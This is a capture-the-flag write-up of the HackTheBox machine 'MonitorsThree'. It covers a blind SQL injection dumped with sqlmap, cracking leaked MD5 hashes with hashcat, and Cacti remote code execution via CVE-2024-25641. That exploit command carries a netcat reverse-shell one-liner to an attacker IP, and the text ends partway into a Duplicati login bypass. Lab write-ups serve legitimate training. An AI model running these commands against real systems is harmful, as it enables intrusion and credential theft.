---
layout: post
title: "MonitorsThree"
date: 2024-10-04 10:04:00 +0000
categories: Writeup
---
MonitorsThree Writeup by <span style="color:yellow">jest</span>.

# Scan

```text
Nmap scan report for 10.10.11.30
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
| ssh-hostkey:
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

&nbsp;

# SQL Injection

There is SQL injection on the forgot password page on the monitorsthree site.:

![image](https://github.com/user-attachments/assets/a4fae5cc-f532-49bb-8228-d0d3068cd8f1)

Verified with the input '.

It looks to be blind.

I captured the request sent via burpsuite and put it into a txt file, then used sqlmap to dump the contents of the database:

![image](https://github.com/user-attachments/assets/406a8e21-219c-4911-a3a6-319dfd25b8ea)


This allowed me to acquire 4 hashes:

```
sqlmap -r post.txt --dump
```

```
dthompson@monitorsthree.htb:633b683cc128fe244b00f176c8a950f5
janderson@monitorsthree.htb:1e68b6eb86b45f6d92f8f292428f77ac
mwatson@monitorsthree.htb:c585d01f2eb3e6e1073e92023088a3dd
admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8
```

We can try cracking the admin@monitorsthree credential:
```bash
hashcat -m 0 -a 0 31a181c8372e3afc59dab863430610e8 /usr/share/wordlists/rockyou.txt
```
This will provide a password.

&nbsp;

# Cacti

I found a cacti subdomain:

![image](https://github.com/user-attachments/assets/027392ce-169d-4c77-88b8-8cf7f41c7102)

Add this to /etc/hosts.

We now have access to cacti with the admin credentials:

![image](https://github.com/user-attachments/assets/380380ca-0ca6-44a3-8da8-23b43181b2a3)


Cacti 1.2.26 suffers from rce via import template.

Cacti doesn't validate file names given through the package import feature, allowing it to overwrite files on the system(even outside the cacti base path, as path traversal isn't filtered).

More can be found <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">here.</a>

I used an automated attack found <a href="https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26">here.</a>

```python
my-venv/bin/python3 CVE-2024-25641.py \
    --user admin \
    --pass greencacti2001 \
    --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 666 >/tmp/f" \
    http://cacti.monitorsthree.htb/cacti/
```
After setting up a listener, this provides access to www-data on the machine.


&nbsp;

# Privilege Escalation

With a shell as www-data, I can see some ports open internally:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:46525         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
udp        0      0 127.0.0.53:53           0.0.0.0:*
udp        0      0 0.0.0.0:68              0.0.0.0:*
```

We can forward 8200 so it is reachable from our machine.

After port forwarding 8200 using chisel, we are presented with a login page:

![image](https://github.com/user-attachments/assets/82c5794a-5245-46f8-8c88-d5242a184f4d)

Duplicati is a backup client, however in one version is vulnerable to login bypass as it allows use for the db server passphrase to authenticate instead of the actual intended password.
This is a big problem as with access to the system and sqllite files, we can craft the passphrase to gain access.

